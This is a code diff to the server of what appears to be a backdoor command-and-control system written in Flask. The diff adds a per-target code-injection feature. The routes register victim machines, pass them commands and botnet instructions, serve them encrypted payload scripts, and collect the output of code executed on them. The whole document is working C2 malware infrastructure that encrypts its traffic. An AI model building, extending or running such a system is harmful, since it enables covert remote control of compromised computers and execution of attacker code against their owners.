@@ -33,7 +33,7 @@ import base64
 import json
 import os
 
-from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instruction_Detail
+from db.modle import APICommand, APILink, ApiToken, Instraction, Targets, BotNet, Instruction_Detail, code_injection_payloads
 from db.mange_db import config, _create_engine
 from utility.email_temp import EmailTemplate
 from utility.processer import log, getlist, readFromJson, update_output, update_user_info, update_target_info, update_socket_info, update_code_output, clean_ANSI_escape_text
@@ -58,12 +58,12 @@ def encrypt_payload(payload):
 
     clipher = AES.new(config.ENCRYPTION_KEY, AES.MODE_EAX)
     ciphertext, tag = clipher.encrypt_and_digest(payload_json)
-
-    return {
+    data = {
         'nonce': base64.b64encode(clipher.nonce).decode(),
         'ciphertext': base64.b64encode(ciphertext).decode(),
         'tag': base64.b64encode(tag).decode()
     }
+    return data
 
 def decrypt_payload(encrypted_data):
     """
@@ -88,7 +88,7 @@ def decrypt_payload(encrypted_data):
 
 
 # recive excute command from the backdoor
-@api.route('/api/ApiCommand/<target_name>')
+@api.route('/api/v1.2/ApiCommand/<target_name>')
 def apiCommand(target_name):
     """
     API endpoint to receive and execute commands from the backdoor.
@@ -131,7 +131,7 @@ def apiCommand(target_name):
         return jsonify(encrypt_payload({'Error': 'Unsupported method'})), 405
 
 
-@api.route('/api/Apicommand/save_output', methods=['POST'])
+@api.route('/api/v1.2/Apicommand/save_output', methods=['POST'])
 def save_output():
     """API endpoint to save command outputs from targets.
     This endpoint receives command outputs from targets and updates the database accordingly.
@@ -186,7 +186,7 @@ def save_output():
         return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
 
-@api.route('/api/BotNet/<target_name>')
+@api.route('/api/v1.2/BotNet/<target_name>')
 def BotNet(target_name):
     """
     API endpoint to retrieve botnet information for a given target.
@@ -260,7 +260,7 @@ def BotNet(target_name):
         return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provid target name"})), 405
 
 
-@api.route('/api/registor_target', methods=['POST'])
+@api.route('/api/v1.2/registor_target', methods=['POST'])
 def registor_target():
     """API endpoint to register a new target with the API.
     This endpoint allows a new target to be registered by providing an API token,
@@ -298,10 +298,12 @@ def registor_target():
                 botNet = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[2], config.STUTAS[1])
                 sock = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[1], config.STUTAS[1])
                 web = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[0], config.STUTAS[1])
+                code_injection = Instraction(config.ID(), config.DELAY, target_name, config.INSTRACTION[3], config.STUTAS[1])
 
                 _session.add(botNet)
                 _session.add(sock)
                 _session.add(web)
+                _session.add(code_injection)
                 _session.commit()
 
                 return jsonify(encrypt_payload({'target_name': target_name})), 200
@@ -316,7 +318,7 @@ def registor_target():
     return jsonify(encrypt_payload({'Error': "Unsupported method or didn't provide target name"})), 405
 
 
-@api.route('/api/get_instraction/<target_name>')
+@api.route('/api/v1.2/get_instraction/<target_name>')
 def instarction(target_name):
     """
     API endpoint to retrieve instructions for a given target.
@@ -433,8 +435,8 @@ def instarction(target_name):
 
 
 
-@api.route('/api/lib/<usePayload>', methods=['GET'])
-def lib(usePayload):
+@api.route('/api/v1.2/injection/lib/<target_name>', methods=['GET'])
+def lib(target_name):
     """
     Endpoint to serve static files from the specified path.
     This endpoint is used to send files like JavaScript libraries or other static resources.
@@ -444,7 +446,8 @@ def lib(usePayload):
         Response: The file is sent as an attachment if it exists, otherwise an error message is returned.
     """
     try:
-        data = decrypt_payload(request.json)
+        print("RAW ARGS:", request.args.to_dict())
+        data = decrypt_payload(request.args)
 
         if request.method == 'GET':
             token = data.get('token')
@@ -455,61 +458,82 @@ def lib(usePayload):
             valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
             if len(valid) == 0:
                 return jsonify({'Error': 'Invalid token'}), 403
-            file_path = config.file_path.format(usePayload)
+        
+            usePayload = getlist(_session.query(code_injection_payloads).filter_by(
+                target_name=target_name,
+                user_status=config.CHECK_UPDATE[1],
+                target_staus=config.STUTAS[1]
+            ).all(), sp=',')
+            print("-----------target name--------------:", target_name)
+            print("-----------usePayload--------------:", usePayload)
+            file_path = os.path.join(config.STATIC_DIR, usePayload[0][1])
             if os.path.exists(file_path):
                 log(f'[ROUT] : {request.endpoint} file: {file_path} is being sent')
                 update_target_info(valid[0][2], ip, opratingSystem)
                 with open(file_path, "r", encoding="utf-8") as f:
                     script_text = f.read()
-                return jsonify(decrypt_payload({'script': script_text}))
+                return jsonify(encrypt_payload({
+                        'script': script_text,
+                        'ID': usePayload[0][0],
+                        'pyload_name': usePayload[0][1]
+                    })), 200
             else:
                 log(f'[ERROR ROUT] : {request.endpoint} error: File not found {file_path}')
                 return jsonify(encrypt_payload({'Error': 'File not found'})), 404
         else:
             return jsonify(encrypt_payload({'Error': "Unsupported method"})), 405
     except Exception as e:
-        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
+        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}\n{traceback.format_exc()}')
         return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500
 
 
-@api.route('/api/injection/<target_name>', methods=['GET', 'POST'])
+@api.route('/api/v1.2/injection/code_output_save/<target_name>', methods=['POST'])
 def injection(target_name):
-    """
-    API endpoint to retrieve or save a Python script for a given target.
-    GET: Returns the script as plain text if found and token is valid.
-    POST: Saves the script output (not implemented here, just a placeholder).
-    Args:
-        target_name (str): The name of the target to retrieve or save for.
-    Returns:
-        JSON response with message or script text, or error message.
-    """
+    
     try:
-        data = decrypt_payload(request.args)
+        data = decrypt_payload(request.json)
 
-        token = data.get('token') if request.method == 'GET' else data.get('token')
-        ip = data.get('ip') if request.method == 'GET' else data.get('ip')
-        os_type = data.get('os') if request.method == 'GET' else data.get('os')
+        if request.method == 'POST':
+            token = data.get('token')
+            if not token:
+                return jsonify({'Error': 'Token not provided'}), 400
+            valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
+            if len(valid) == 0:
+                return jsonify({'Error': 'Invalid token'}), 403
+            opratingSystem = data.get('os')
+            ip = data.get('ip')
+            
+            update_target_info(valid[0][2], ip, opratingSystem)
+            pyload_name = data.get('pyload_name')
+            print('pyload_name->',pyload_name)
+            ID = data.get('ID')
+            code_output = data.get('code_output')
+            valid_paylaod = getlist(_session.query(code_injection_payloads).filter_by(
+                target_name=target_name,
+                user_status=config.CHECK_UPDATE[1],
+                target_staus=config.STUTAS[1],
+                payload_name=pyload_name,
+                ID=ID
+            ).all(), sp=',')
 
-        update_target_info(target_name, ip, os_type)
-        valid = getlist(_session.query(ApiToken).filter_by(token=token).all(), sp=',')
-        if not valid:
-            return jsonify({'message': 'invalid'}), 403
-
-        if request.method == 'GET':
-            script_path = config.file_path.format(f"{target_name}.py")
-            if os.path.exists(script_path):
-                with open(script_path, "r", encoding="utf-8") as f:
-                    script_text = f.read()
-                return jsonify(decrypt_payload({'script': script_text})), 200
-            else:
-                return jsonify(encrypt_payload({'message': 'Script not found'})), 404
-
-        elif request.method == 'POST':
-            update_code_output(target_name, request.json.get('code_output'))
-            return jsonify(encrypt_payload({'message': 'Output saved (not implemented)'})), 200
-
-        return jsonify(encrypt_payload({'message': 'invalid method'})), 405
-
+            if len(valid_paylaod) == 0:
+                return jsonify({'Error': 'Invalid payload'}), 403
+            _session.query(code_injection_payloads).filter_by(
+                target_name=target_name,
+                user_status=config.CHECK_UPDATE[1],
+                target_staus=config.STUTAS[1],
+                payload_name=pyload_name,
+                ID=ID
+            ).update(
+                {
+                    'target_staus': config.STUTAS[0]
+                }
+            )
+            _session.commit()
+            update_code_output(target_name, pyload_name, ID, code_output)
+            return jsonify({'message': 'Code output saved successfully'}), 200
+        else:
+            return jsonify({'Error': "Unsupported method"}), 405
     except Exception as e:
-        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}')
-        return jsonify(encrypt_payload({'message': 'Error'})), 500
+        log(f'[ERROR ROUT] : {request.endpoint} error: {str(e)}\n{traceback.format_exc()}')
+        return jsonify(encrypt_payload({'Error': 'Internal server error'})), 500
